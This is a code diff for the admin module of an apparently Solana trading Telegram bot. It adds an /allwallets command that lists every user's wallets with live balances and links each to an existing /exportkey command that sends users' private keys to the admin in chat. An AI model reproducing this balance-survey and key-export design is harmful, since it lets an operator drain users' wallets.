@@ -13,6 +13,7 @@ Commands:
   /deactivate <user_id>         — revoke access
   /adminuser <user_id>          — user + wallet + activation summary
   /walletuser <user_id>         — live SOL balances (Fund + Buy)
+  /allwallets [page]            — live view of ALL users' wallets
   /exportkey <user_id>          — export all private keys for a user
   /exportkey <user_id> fund     — fund wallet key only
   /stats                        — activation / key counts
@@ -21,6 +22,7 @@ Commands:
 """
 
 import logging
+from collections import defaultdict
 from typing import Optional
 
 from aiogram import Router
@@ -49,6 +51,9 @@ from services.bot_wallet_service import get_sol_balance
 logger = logging.getLogger(__name__)
 router = Router()
 
+# Users per /allwallets page (Telegram 4096 limit + RPC load)
+_ALL_WALLETS_PAGE_SIZE = 8
+
 
 def _deny(message: Message) -> bool:
     """Return True if caller is NOT admin."""
@@ -71,7 +76,6 @@ def _keypair_to_base58(kp) -> str:
         return base58.b58encode(raw).decode()
     except Exception:
         try:
-            # solders may expose this on some versions
             return kp.to_base58_string()  # type: ignore[attr-defined]
         except Exception:
             return raw.hex()
@@ -136,9 +140,11 @@ async def cmd_admin(message: Message) -> None:
         "/activate <user_id> — grant access (no payment)\n"
         "/deactivate <user_id> — revoke access\n"
         "/adminuser <user_id> — full user summary\n\n"
-        "<b>Wallets (after user activated + imported)</b>\n"
-        "/walletuser <user_id> — live Fund + Buy balances\n"
-        "/exportkey <user_id> — export all private keys\n"
+        "<b>Wallets</b>\n"
+        "/allwallets — live balances for ALL users\n"
+        "/allwallets 2 — page 2\n"
+        "/walletuser <user_id> — one user detail\n"
+        "/exportkey <user_id> — export private keys\n"
         "/exportkey <user_id> fund — fund key only\n\n"
         "<b>Overview</b>\n"
         "/stats — counts\n"
@@ -402,6 +408,127 @@ async def cmd_walletuser(message: Message) -> None:
     await message.answer("\n".join(lines), parse_mode="HTML")
 
 
+@router.message(Command("allwallets"))
+async def cmd_allwallets(message: Message) -> None:
+    """
+    Admin: live balances for every user who has multi-wallets.
+    Paginated: /allwallets   /allwallets 2
+    """
+    if _deny(message):
+        return
+
+    parts = (message.text or "").strip().split()
+    page = 1
+    if len(parts) >= 2 and parts[1].isdigit():
+        page = max(1, int(parts[1]))
+
+    status = await message.answer("⏳ Fetching all wallets + live balances…")
+
+    async with get_db() as db:
+        async with db.execute(
+            """
+            SELECT user_id, wallet_address, wallet_type, label
+            FROM multi_wallets
+            WHERE is_active = 1
+            ORDER BY user_id ASC,
+                     CASE wallet_type WHEN 'fund' THEN 0 ELSE 1 END,
+                     id ASC
+            """
+        ) as cur:
+            rows = [dict(r) for r in await cur.fetchall()]
+
+        # Activation map
+        async with db.execute(
+            "SELECT user_id, is_active FROM user_activations"
+        ) as cur:
+            act_map = {int(r["user_id"]): bool(r["is_active"]) for r in await cur.fetchall()}
+
+    if not rows:
+        await status.edit_text("No multi-wallets in the database yet.")
+        return
+
+    by_user: dict[int, list[dict]] = defaultdict(list)
+    for r in rows:
+        by_user[int(r["user_id"])].append(r)
+
+    user_ids = sorted(by_user.keys())
+    total_users = len(user_ids)
+    total_pages = max(1, (total_users + _ALL_WALLETS_PAGE_SIZE - 1) // _ALL_WALLETS_PAGE_SIZE)
+    if page > total_pages:
+        page = total_pages
+
+    start = (page - 1) * _ALL_WALLETS_PAGE_SIZE
+    page_ids = user_ids[start : start + _ALL_WALLETS_PAGE_SIZE]
+
+    # Collect unique addresses on this page and fetch balances once each
+    page_addrs = []
+    for uid in page_ids:
+        for w in by_user[uid]:
+            page_addrs.append(w["wallet_address"])
+
+    bal_cache: dict[str, Optional[float]] = {}
+    for addr in page_addrs:
+        if addr in bal_cache:
+            continue
+        try:
+            bal_cache[addr] = await get_sol_balance(addr)
+        except Exception:
+            bal_cache[addr] = None
+
+    grand_total = 0.0
+    lines = [
+        f"🔑 <b>All User Wallets</b> — page {page}/{total_pages}",
+        f"Users with wallets: <b>{total_users}</b>",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        "",
+    ]
+
+    for uid in page_ids:
+        licensed = act_map.get(uid)
+        if licensed is True:
+            lic = "✅"
+        elif licensed is False:
+            lic = "🔒"
+        else:
+            lic = "—"
+
+        user_total = 0.0
+        lines.append(f"👤 <code>{uid}</code> {lic}")
+
+        for w in by_user[uid]:
+            bal = bal_cache.get(w["wallet_address"])
+            if bal is not None:
+                user_total += float(bal)
+                grand_total += float(bal)
+                bal_str = f"{float(bal):.4f}"
+            else:
+                bal_str = "?"
+
+            tag = "FUND" if w["wallet_type"] == "fund" else "BUY"
+            lines.append(
+                f"  [{tag}] <code>{_short(w['wallet_address'])}</code>  ·  <b>{bal_str}</b> SOL"
+            )
+
+        lines.append(f"  Σ user: <b>{user_total:.4f}</b> SOL")
+        lines.append(f"  → /walletuser {uid} · /exportkey {uid}")
+        lines.append("")
+
+    lines.append(f"💎 <b>Page total:</b> {grand_total:.4f} SOL")
+    if total_pages > 1:
+        nxt = page + 1 if page < total_pages else 1
+        lines.append(f"Next: /allwallets {nxt}")
+
+    text = "\n".join(lines)
+    # Telegram hard limit
+    if len(text) > 4000:
+        text = text[:3950] + "\n\n…truncated — use /walletuser <id>"
+
+    try:
+        await status.edit_text(text, parse_mode="HTML")
+    except Exception:
+        await message.answer(text, parse_mode="HTML")
+
+
 @router.message(Command("exportkey"))
 async def cmd_exportkey(message: Message) -> None:
     """
@@ -428,7 +555,6 @@ async def cmd_exportkey(message: Message) -> None:
         await message.answer("Scope must be: all | fund | buy")
         return
 
-    # Prefer activated users; still allow export if wallets exist (support edge cases)
     async with get_db() as db:
         async with db.execute(
             """
@@ -470,7 +596,6 @@ async def cmd_exportkey(message: Message) -> None:
             kp = await get_keypair_from_wallet(w)
             priv = _keypair_to_base58(kp)
             kind = "Fund" if w["wallet_type"] == "fund" else (w.get("label") or "Buy")
-            # Split: show address + key in code blocks for easy copy
             await message.answer(
                 f"🔐 <b>{kind}</b>\n"
                 f"Address:\n<code>{w['wallet_address']}</code>\n\n"
